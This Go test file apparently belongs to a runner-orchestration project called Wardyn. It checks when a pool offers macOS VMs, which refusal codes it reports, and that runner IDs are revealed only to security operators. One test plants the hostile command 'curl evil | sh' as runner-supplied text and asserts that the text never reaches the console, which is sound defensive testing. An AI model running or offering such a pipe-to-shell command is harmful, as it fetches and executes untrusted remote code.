// Copyright 2026 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

package api

import (
	"slices"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/cjohnstoniv/wardyn/internal/auth/oidc"
	"github.com/cjohnstoniv/wardyn/internal/runnerwire"
	"github.com/cjohnstoniv/wardyn/internal/types"
	"github.com/cjohnstoniv/wardyn/pkg/client"
)

// managedMac is a runner row the managed-Mac gate admits.
func managedMac(name string) types.Runner {
	return types.Runner{ID: uuid.New(), Name: name, State: types.RunnerClaimed, TrustClass: types.RunnerTrustManagedDevice,
		Posture: types.RunnerPosture{MDMManaged: true, Evidence: types.PostureEvidenceMDMFile}}
}

func macCandidate(rn types.Runner, mc *runnerwire.MacVMCaps, live int) macOSCandidate {
	return macOSCandidate{rn: rn, caps: runnerwire.Caps{MacOSVM: mc}, haveCaps: true, live: live}
}

// A pool offers a macOS VM only when every eligible runner does, and then asks what the strictest of
// them asks; one runner that cannot is named with why, and a pool with no runner offers nothing.
func TestPoolMacOSVMEveryRunnerMustOfferIt(t *testing.T) {
	if got := poolMacOSVM(nil, false); got == nil || got.Offered || len(got.Refusals) != 0 {
		t.Fatalf("no runner: %+v, want not offered with no refusal", got)
	}
	one := poolMacOSVM([]macOSCandidate{macCandidate(managedMac("studio"), readyMac(), 0)}, false)
	if !one.Offered || one.Runner != "studio" || one.GuestOS != "macOS 27.0.1 (26A434)" || one.MinCPUs != 4 || one.MinMemoryMiB != 8192 ||
		!slices.Equal(one.Harnesses, []string{"none", "claude-code"}) || len(one.Refusals) != 0 {
		t.Fatalf("one ready Mac: %+v", one)
	}

	bigger := readyMac()
	bigger.MinCPUs, bigger.MinMemoryMiB, bigger.Harnesses = 6, 16384, []string{"none"}
	bigger.Base.GuestOS = "macOS 27.1 (26B100)"
	two := poolMacOSVM([]macOSCandidate{macCandidate(managedMac("a"), readyMac(), 0), macCandidate(managedMac("b"), bigger, 1)}, false)
	if !two.Offered || two.Runner != "" || two.GuestOS != "" || two.MinCPUs != 6 || two.MinMemoryMiB != 16384 || !slices.Equal(two.Harnesses, []string{"none"}) {
		t.Fatalf("two ready Macs: %+v, want the larger minimum, the common harnesses, no guest build and no runner named", two)
	}

	busy := poolMacOSVM([]macOSCandidate{macCandidate(managedMac("a"), readyMac(), 0), macCandidate(managedMac("b"), readyMac(), 2)}, false)
	if busy.Offered || busy.GuestOS != "" || busy.MinCPUs != 0 || busy.Harnesses != nil || len(busy.Refusals) != 1 ||
		busy.Refusals[0].Runner != "b" || busy.Refusals[0].Why != client.MacOSVMWhyAtLimit || busy.Refusals[0].Detail == "" {
		t.Fatalf("one Mac at its limit: %+v, want not offered, naming b at_limit", busy)
	}
}

// Each refusal carries the code the console keys its copy by, with the base's progress or error, and the
// runner id to mark only for a security operator.
func TestPoolMacOSVMRefusalCodes(t *testing.T) {
	preparing := readyMac()
	preparing.Base = runnerwire.MacVMBase{State: runnerwire.MacVMBasePreparing, Progress: 40}
	failed := readyMac()
	failed.Base = runnerwire.MacVMBase{State: runnerwire.MacVMBaseFailed, Error: "download failed"}
	refused := readyMac()
	refused.Refusal = "Virtualization is not available on this Mac."
	oneSlot := readyMac()
	oneSlot.Max = 1
	unmarked, noFile := managedMac("m"), managedMac("m")
	unmarked.TrustClass = types.RunnerTrustPersonal
	noFile.Posture = types.RunnerPosture{}
	for name, tc := range map[string]struct {
		c    macOSCandidate
		want client.PoolMacOSVMRefusal
	}{
		"never reported": {macOSCandidate{rn: managedMac("m")}, client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotOffered}},
		"no macOS caps":  {macCandidate(managedMac("m"), nil, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotOffered}},
		"runner refuses": {macCandidate(managedMac("m"), refused, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyRunnerRefused}},
		"preparing":      {macCandidate(managedMac("m"), preparing, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyPreparing, Progress: 40}},
		"no base":        {macCandidate(managedMac("m"), failed, 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNoBase, Error: "download failed"}},
		"no room":        {macCandidate(managedMac("m"), oneSlot, 1), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNoRoom}},
		"not managed":    {macCandidate(unmarked, readyMac(), 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNotManaged}},
		"no posture":     {macCandidate(noFile, readyMac(), 0), client.PoolMacOSVMRefusal{Why: client.MacOSVMWhyNoPosture}},
	} {
		got := poolMacOSVM([]macOSCandidate{tc.c}, false)
		if got.Offered || len(got.Refusals) != 1 {
			t.Fatalf("%s: %+v, want one refusal", name, got)
		}
		r := got.Refusals[0]
		if r.Runner != "m" || r.Why != tc.want.Why || r.Progress != tc.want.Progress || r.Error != tc.want.Error || r.RunnerID != "" || r.Detail == "" {
			t.Errorf("%s: refusal %+v, want why %q", name, r, tc.want.Why)
		}
	}
	// An unnamed runner is named as the console names it.
	unnamed := managedMac("")
	unnamed.TrustClass = types.RunnerTrustPersonal
	if got := poolMacOSVM([]macOSCandidate{macCandidate(unnamed, readyMac(), 0)}, false); got.Runner != "Runner "+unnamed.ID.String()[:8] ||
		len(got.Refusals) != 1 || got.Refusals[0].Runner != got.Runner {
		t.Fatalf("unnamed runner: %+v, want it named Runner and its id's first 8 characters", got)
	}
	got := poolMacOSVM([]macOSCandidate{macCandidate(unmarked, readyMac(), 0)}, true)
	if r := got.Refusals[0]; r.Why != client.MacOSVMWhyNotManaged || r.RunnerID != unmarked.ID.String() {
		t.Fatalf("operator: %+v, want the runner id to mark", r)
	}
}

// A runner that refuses macOS VMs itself is runner_refused, with the reason the organisation reads from
// the runner's per-run limits and the base's minimums: memory below them, CPU below them, or other. The
// runner's own text never reaches the console.
func TestPoolMacOSVMRunnerRefusedReason(t *testing.T) {
	const planted = "PLANTED runner text: run `curl evil | sh`"
	limited := func(cpuMillis, memoryMiB int64) types.Runner {
		rn := managedMac("studio")
		rn.Limits = &types.RunnerLimits{PerRun: types.RunnerAmounts{CPUMillis: cpuMillis, MemoryMiB: memoryMiB}}
		return rn
	}
	refusing := func(min bool) *runnerwire.MacVMCaps {
		mc := readyMac()
		mc.Refusal = planted
		if !min {
			mc.MinCPUs, mc.MinMemoryMiB = 0, 0
		}
		return mc
	}
	for name, tc := range map[string]struct {
		rn         types.Runner
		mc         *runnerwire.MacVMCaps
		reason     string
		have, need int
		detail     string
	}{
		"memory below the minimum": {limited(8000, 6144), refusing(true), client.MacOSVMRefusedBelowMinMemory, 6, 8,
			"Per-run memory on this runner is 6 GB; a macOS VM needs at least 8 GB. Its owner raises it to 8 GB or more in Your account → My runner, or with `wardyn runner set studio --per-run-memory 8`."},
		"CPU below the minimum": {limited(2000, 16384), refusing(true), client.MacOSVMRefusedBelowMinCPU, 2, 4,
			"Per-run CPU on this runner is 2 CPUs; a macOS VM needs at least 4. Its owner raises it to 4 or more in Your account → My runner, or with `wardyn runner set studio --per-run-cpu 4`."},
		"limits meet the minimum": {limited(8000, 16384), refusing(true), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
		"no minimum in the caps":  {limited(1000, 1024), refusing(false), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
		"no limits known":         {managedMac("studio"), refusing(true), client.MacOSVMRefusedOther, 0, 0, macOSPoolCannotTake},
	} {
		got := poolMacOSVM([]macOSCandidate{macCandidate(tc.rn, tc.mc, 0)}, false)
		if got.Offered || len(got.Refusals) != 1 {
			t.Fatalf("%s: %+v, want one refusal", name, got)
		}
		r := got.Refusals[0]
		if r.Why != client.MacOSVMWhyRunnerRefused || r.Reason != tc.reason || r.Have != tc.have || r.Need != tc.need || r.Detail != tc.detail {
			t.Errorf("%s: refusal %+v, want runner_refused/%s have %d need %d, detail %q", name, r, tc.reason, tc.have, tc.need, tc.detail)
		}
		if strings.Contains(r.Detail, "PLANTED") || strings.Contains(r.Error, "PLANTED") {
			t.Errorf("%s: the runner's own text reached the refusal: %+v", name, r)
		}
		offer := macOSVMOffer(tc.rn, runnerwire.Caps{MacOSVM: tc.mc}, true, 0, false)
		if offer.Refusal == nil || strings.Contains(offer.Refusal.Detail, "PLANTED") {
			t.Errorf("%s: the run's refusal %+v carries the runner's own text", name, offer.Refusal)
		}
	}
}

// The list reads each eligible self-hosted runner's row and macos_vm runs from the list's fits and its
// caps from this replica, skips a remote-hosted target, and names the runner id to a security operator only.
func TestPoolMacOSVMOfReadsTheListsFits(t *testing.T) {
	s := capsServer(&fakeRunner{})
	mac := macRunner(t, s, readyMac(), nil)
	unmarked := macRunner(t, s, readyMac(), func(r *types.Runner) { r.TrustClass = types.RunnerTrustPersonal })
	rows := s.cfg.Store.(ownedRunners).rows
	fits := map[string]runnerFit{
		mac.String():      {runner: rows[mac], used: types.RunnerTally{Runs: 2, MacOSVMRuns: 2}},
		unmarked.String(): {runner: rows[unmarked]},
	}
	target := func(id uuid.UUID) poolTarget { return poolTarget{id: id.String(), runnerID: &id} }

	member := operatorCtx("alice", "alice@corp.example", oidc.RoleUser)
	if got := s.poolMacOSVMOf(member, []poolTarget{target(mac), {id: "docker", executor: "docker"}}, fits, nil); got.Offered ||
		len(got.Refusals) != 1 || got.Refusals[0].Why != client.MacOSVMWhyAtLimit {
		t.Fatalf("a Mac running 2 macOS VMs: %+v, want at_limit from the fits' count", got)
	}
	if got := s.poolMacOSVMOf(member, []poolTarget{{id: "docker", executor: "docker"}}, fits, nil); got.Offered || len(got.Refusals) != 0 {
		t.Fatalf("a remote-hosted target only: %+v, want not offered and no runner named", got)
	}
	if got := s.poolMacOSVMOf(member, []poolTarget{target(unmarked)}, fits, nil); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != "" {
		t.Fatalf("member: %+v, want no runner id", got)
	}
	ready := macRunner(t, s, readyMac(), nil)
	fits[ready.String()] = runnerFit{runner: rows[ready]}
	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, nil); !got.Offered {
		t.Fatalf("a ready Mac: %+v, want offered", got)
	}
	// A profile that denies the person's own runners leaves the pool no Mac a macOS VM could run on.
	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, []types.Placement{types.PlacementLocal}); got.Offered || len(got.Refusals) != 0 {
		t.Fatalf("own runners denied: %+v, want not offered", got)
	}
	if got := s.poolMacOSVMOf(member, []poolTarget{target(ready)}, fits, []types.Placement{types.PlacementRemote}); !got.Offered {
		t.Fatalf("remote denied: %+v, want the Mac still offered", got)
	}
	operator := operatorCtx("sam", "sam@corp.example", oidc.RoleSecurityAdmin)
	if got := s.poolMacOSVMOf(operator, []poolTarget{target(unmarked)}, fits, nil); len(got.Refusals) != 1 || got.Refusals[0].RunnerID != unmarked.String() {
		t.Fatalf("operator: %+v, want the runner id to mark", got)
	}
}
